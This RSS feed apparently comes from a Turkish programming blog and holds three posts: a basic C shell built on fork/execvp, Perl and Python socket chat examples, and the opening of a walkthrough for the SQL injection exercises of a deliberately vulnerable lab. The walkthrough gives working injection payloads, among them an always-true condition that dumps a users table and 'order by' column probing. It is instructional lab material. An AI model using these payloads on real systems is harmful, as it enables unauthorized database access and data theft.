<?xml version="1.0"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <link>http://localhost:4000</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <description></description>
    <language>en-us</language>
    <pubDate>Sun, 19 Mar 2017 19:49:07 +0300</pubDate>
    <lastBuildDate>Sun, 19 Mar 2017 19:49:07 +0300</lastBuildDate>

    
      <item>
        <title>C ile Basit Linux Shell</title>
        <link>http://localhost:4000/basic-linux-shell-fork-execvp</link>
        <pubDate>Sun, 19 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      &lt;strong&gt;C&lt;/strong&gt; dilini kullanıp basit bir &lt;strong&gt;linux shell&lt;/strong&gt; yazarak &lt;strong&gt;parent-child process&lt;/strong&gt; işleyiş mantığını anlatmaya çalıştık. Buradaki önemli fonksiyonlarımız &lt;strong&gt;fork()&lt;/strong&gt; ve &lt;strong&gt;execvp()&lt;/strong&gt; fonksiyonlarıdır.&lt;/p&gt;

&lt;p&gt;      Oluşturulan alt süreç, üst programın yaptığı gibi aynı programı çalıştırmak zorunda değildir. &lt;strong&gt;Exec&lt;/strong&gt; tipi sistem çağrıları, bir işlemi, ikili bir şekilde yürütülebilir ve herhangi bir program dosyasını çalıştırmaya izin verir. Aşağıdaki programda şöyle bir sistem çağrısı görüyoruz : &lt;strong&gt;execvp()&lt;/strong&gt;.
Execvp () sistem çağrısı iki bağımsız değişkeni gerektirir:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;İlk argüman yürütülecek bir dosyanın adını içeren bir karakter dizesidir.&lt;/li&gt;

&lt;li&gt;İkinci argüman, bir dizi karakter dizisine işaret eden bir işaretçidir. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;      Bu argümanların sıfır(&lt;strong&gt;NULL&lt;/strong&gt;) ile bitmesi gerektiğini unutmayın. Execvp() yürütüldüğünde, ilk argüman tarafından verilen program dosyası çağıranın adres alanına yüklenecek ve orada programı over-write edecektir. Ardından, ikinci argüman programa verilecek ve yürütme işlemi başlatılacaktır. Sonuç olarak, belirtilen program dosyası çalıştırılmaya başlandığında, shell üzerindeki  çalışan program gidecek ve yeni programla değiştirilecektir.&lt;/p&gt;

&lt;p&gt;      Execvp (), yürütme başarısız olursa (örn. istek dosyası mevcut değilse) negatif bir değer döndürür. Burada yaptığımız önemli işlemlerden birisi aldığımız karakter dizisindeki ifadeyi parçalara ayırıp  hangi komut çalışacak hangi dosya yollarını kullanacak bunu belirlemektir. Yani çalıştırmak istediğimiz komutun aldığı parametreleri de ayrı birer karakter dizisinde tutup işlem yaptırıyoruz.&lt;/p&gt;

&lt;h4&gt;C Kodu&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;


int main()
{

	char* i_komut[100]; 
char* ref_yol= &quot;/bin/&quot;; 
char program_yolu[20];           
int sayac;			
char *komut = (char*) malloc(100);  



printf(&quot;&amp;gt;&amp;gt;&quot;);          

while(scanf(&quot;%[^\n]%*c&quot;,komut)) 
{

size_t length = strlen(komut);   	 
if (komut[length - 1] == '\n')  
    komut[length - 1] = '\0';      





if(strcmp(komut,&quot;exit&quot;)==0)
{ 
        break;
}

if(strcmp(komut,&quot;clear&quot;)==0)
{ 
        system(&quot;clear&quot;);
}

char *token;                        
token = strtok(komut,&quot; &quot;);          
int i=0;                          

while(token!=NULL)
{
        i_komut[i]=token;      
        token = strtok(NULL,&quot; &quot;);
        i++;
	}

	i_komut[i]=NULL;                     

sayac=i;                           

for(i=0; i&amp;lt;sayac; i++)
{
        printf(&quot;%s\n&quot;, i_komut[i]);      
}

strcpy(program_yolu, ref_yol);         
strcat(program_yolu, i_komut[0]);      

for(i=0; i&amp;lt;strlen(program_yolu); i++)
{     
        if(program_yolu[i]=='\n'){           
            program_yolu[i]='\0';           
        }
}
  
int pid= fork();              

if(pid==0)
{                       
        execvp(program_yolu,i_komut);        
        fprintf(stderr, &quot;Child process baslatilamadi !\n&quot;); 
							
}
else
{                    
        wait(NULL);          
        printf(&quot;Child process çalıştı ! \n&quot;);       
}

printf(&quot;&amp;gt;&amp;gt;&quot;);

}


} 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
      </item>
    
      <item>
        <title>Client-Server Örnekleri (Perl - Python)</title>
        <link>http://localhost:4000/client-server-perl-python</link>
        <pubDate>Sat, 18 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;h3&gt;Perl Client-Server&lt;/h3&gt;

&lt;p&gt;      Burada Perl dilini kullanarak bir &lt;strong&gt;Client-Server&lt;/strong&gt; uygulaması gerçekleştirmeye çalıştık. 
Tabiki olmazsa olmaz diyerekten &lt;strong&gt;Socket&lt;/strong&gt; kütüphanesini import ediyoruz. 
&lt;strong&gt;IO::Socket::INET&lt;/strong&gt; ,AF_INET (ARPA Internet protocols) domain socketleri için nesne arayüzüdür.
Bu sınıfı kullanarak bir nesne oluşturacağız. Bu nesne constractoru içerisinde aşağıdaki
değişkenler bulunabilir.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;1. PeerAddr &lt;/li&gt;
&lt;li&gt;2. PeerHost &lt;/li&gt;
&lt;li&gt;3. PeerPort &lt;/li&gt;
&lt;li&gt;4. LocalAddr &lt;/li&gt;
&lt;li&gt;5. LocalHost &lt;/li&gt;
&lt;li&gt;6. LocalPort &lt;/li&gt;
&lt;li&gt;7. Proto &lt;/li&gt;
&lt;li&gt;8. Type &lt;/li&gt;
&lt;li&gt;9. Listen &lt;/li&gt;
&lt;li&gt;10. ReuseAddr &lt;/li&gt;
&lt;li&gt;11. Reuse &lt;/li&gt;
&lt;li&gt;12. ReusePort &lt;/li&gt;
&lt;li&gt;13. Broadcast &lt;/li&gt;
&lt;li&gt;14. Timeout &lt;/li&gt;
&lt;li&gt;15. MultiHomed &lt;/li&gt;
&lt;li&gt;16. Blocking &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Biz buradan :&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;LocalHost&lt;/strong&gt; : Yerel makina bağlantı adresi&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;LocalPort&lt;/strong&gt; : Yerel makina bağlantı portu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Proto&lt;/strong&gt;     : Bağlanti Protolü&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Listen&lt;/strong&gt;   :	Dinlemek için queue boyutu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;PeerAddr&lt;/strong&gt;  : Uzak makina bağlantı adresi&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;PeerPort&lt;/strong&gt;  : Uzak makine bağlantı portu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;değişkenlerini kullanacağız.&lt;/p&gt;

&lt;p&gt;      Bağlantı kurulacak port numarasını dışarıdan input olarak alınmasını belirledik fakat 
genelde yüksek numaralı portlar tercih edilir.&lt;/p&gt;

&lt;p&gt;      Uygulama basit bir yazışma uygulaması olarak düşünülebilir. Karşı taraf için bir socket
tanımlayıp  bağlantı beklenmeye başlanır . Bu socket karşı tarafın adresini ve port numarasını 
içerir. Bağlantı sağlanınca devamında ‘basit’ yazışma kanalına girilir. Burada önce server 
tarafı ve sonra client tarafı yazmak koşuluyla iletişim sağlanır.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Server Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;vg&quot;&gt;$|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Port numarası giriniz...\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::Socket::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;INET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LocalHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LocalPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Proto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'tcp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Listen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;die&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Port açılamadı!&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Bağlantı bekleniyor...Port : $port\n &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$peer_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;peerhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$peer_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;peerport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n CTRL Chat Server'a  Bağlantı Kuruldu. ( $peer_address , $peer_port ) \n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hakan: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;autoflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; 

    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      &lt;strong&gt;Client&lt;/strong&gt; tarafı için yine aynı şekilde bir socket nesnesi oluşturuyoruz. &lt;strong&gt;PeerAddr&lt;/strong&gt; olarak görünen yer
server adresidir. &lt;strong&gt;PeerPort&lt;/strong&gt; ise server’ın hangi portundan bağlantı sağlanacağıdır. Burada yine
dışarıdan port numarasını input alarak ilerledik.Aynı port numarası girildiğinde 
bağlantı sağlanır. Bağlantı kurulunca yazışma kanalına geçilir ve belirtilen 
kurallar dahilinde  iletişim sağlanabilir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Client Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Port numarası giriniz...\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::Socket::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;INET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;PeerAddr&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;PeerPort&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;Proto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'tcp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;die&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Bağlantı Kurulamadı !\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Kullanici : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3&gt;Python Client-Server&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Server Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
import socketserver
import threading 

class threadexample (threading.Thread): 
   		def __init__(self, threadID, name):
   			threading.Thread.__init__(self)
   			self.threadID=threadID
   			self.name = name
   		def run(self):
   			while True:
     		a=baglanti.recv(1000)
     		print(a.decode())
   
class threadexample2 (threading.Thread):
   		def __init__(self, threadID, name):        
    		threading.Thread.__init__(self)
    		self.threadID=threadID
    		self.name = name
   		def run(self): 
   			while True:
       		a=input(&quot;Server: &quot;) 
       		baglanti.send(a.encode())


myserver=socket.socket()
mylocal=socket.gethostname()

myserver.bind((mylocal,3969))
myserver.listen(5)

while True:
		baglanti, adress = myserver.accept()
		print(&quot;Bağlantı Sağlandi...&quot;  )
		print(adress)
		thread1=threadexample(1,&quot;recv&quot;)
		thread1.start()
		thread1=threadexample2(2,&quot;send&quot;)
		thread1.start()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Client Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
import sys
import threading

class threadexample (threading.Thread):
		def __init__(self, threadID, name):        
    		threading.Thread.__init__(self)
    		self.threadID=threadID
    		self.name = name
		def run(self):
    		while True:
      		a=mysocket.recv(1000)
      		print(a.decode())
    
class threadexample2 (threading.Thread):
		def __init__(self, threadID, name):    
     		threading.Thread.__init__(self)
     		self.threadID=threadID
     		self.name = name
		def run(self):        
    		while True:
        		a=input(&quot;Client: &quot;)
        		mysocket.send(a.encode())


mysocket=socket.socket()

#host=&quot;0x6cac60.github.io&quot;
#addres=socket.gethostbyname(host)
mylocal=socket.gethostname()
port=3969

mysocket.connect((mylocal,port))
a=&quot;selam&quot;.encode()
mysocket.send(a)
#while True: 
thread1=threadexample(1,&quot;recv&quot;)
thread2=threadexample2(3,&quot;sxend&quot;)
thread1.start()
thread2.start()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Bu konu literatürde &lt;strong&gt;socket programlama&lt;/strong&gt; olarakta geçer.Bu yazışma programı Socket programlama 
kapsamında basit bir &lt;strong&gt;Client-Server&lt;/strong&gt; uygulamasıdır.&lt;/p&gt;

</description>
      </item>
    
      <item>
        <title>WEB For Pentester 1 - SQL Injections Bölümü Çözümleri</title>
        <link>http://localhost:4000/wfp1-sql-injection-cozumleri</link>
        <pubDate>Fri, 17 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      &lt;strong&gt;Web For Pentester&lt;/strong&gt; yaygın Web zafiyetlerini bize sunan ve bu zafiyetlerden yararlanmaya çalışarak çözümlere ulaştığımız
bir test sistemidir. Bu adresten bilgisayarınıza indirebilirsiniz.&lt;a href=&quot;https://www.pentesterlab.com/exercises/web_for_pentester&quot;&gt;Bu&lt;/a&gt; adresten bilgisayarınıza indirebilirsiniz.
ISO kalıbı bilgisayarınıza indikten sonra Vmware,Virtual Machine gibi sanal makina sistemlerinden birine kurmanız gerekir. Kurulumdan sonra sanal makinenizdeki sistem de&lt;/p&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;&lt;strong&gt;»ifconfig&lt;/strong&gt;&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;yazarak gördüğünüz IP adresini Ana makinenizdeki tarayıcınıza yazarak &lt;strong&gt;WFP&lt;/strong&gt; sorularına ulaşabilirsiniz.
Bu yazıda &lt;strong&gt;SQL Injections&lt;/strong&gt; Bölümünün çözümlerini anlatmaya çalışacağız.Syntax yapısını sağlamak için gereken  URL encode karakterlerine de
&lt;a href=&quot;https://www.w3schools.com/tags/ref_urlencode.asp&quot;&gt;şurayı&lt;/a&gt;	ziyaret ederek ulaşabilirsiniz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example 1&lt;/strong&gt;&lt;br /&gt;
      Soruda tırnak (‘) koyup deneme yaptığımızda ekranın bir hatadan dolayı değiştiğini görüyoruz. Buradan araya kod sıkıştırabileceğimizi anlıyoruz.  Örnek olarak arka tarafta çalışan sorgu:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. select id,name,age from users where name='root'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Buraya şu ifadeyi eklediğimizde&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. select id,name,age from users where name='root' or 1 or''
2. select id,name,age from users where 1 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;İkinci  duruma geldiğini düşünebiliriz. Bununla bütün değerleri çağırmış oluyoruz ve listeliyoruz.
‘or 1 or’ ifadesini aşağıdaki gibi URL’ye eklediğimizde tüm tabloyu listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root'or 1 or'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Burada çıkan kullanıcıları ve bilgileri görüyoruz. Örneğin user1 ile devam edelim. Buraya yazdığımız kelime sonucu etkilemez. Önümüzdeki tabloda kaç tane sütun olduğunu aşağıdaki komutla deneyerek buluyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' order by 1 %23
2. http://192.168.96.129/sqli/example1.php?name=user1' order by 2 %23
3. http://192.168.96.129/sqli/example1.php?name=user1' order by 3 %23
4. http://192.168.96.129/sqli/example1.php?name=user1' order by 4 %23
5. http://192.168.96.129/sqli/example1.php?name=user1' order by 5 %23
6. http://192.168.96.129/sqli/example1.php?name=user1' order by 6 %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Ve en son 6 da hata oluyor yani önümüze hiç bir şey çıkmıyor. Buradan 5 tane sütunumuz olduğunu anlıyoruz.&lt;strong&gt;‘%23’&lt;/strong&gt; ifadesi de (#) anlamına geliyor yani sonrasında gelen ifadeleri yok sayıyor. Bu sayede syntax hatalarından kurtuluyoruz.
Bu aşamadan sonra bilgi toplamaya başlıyoruz.İlk sütuna ve ikinci sütuna tablo ve versiyon bilgilerini bastırmak için bunu uyguluyoruz.&lt;/p&gt;

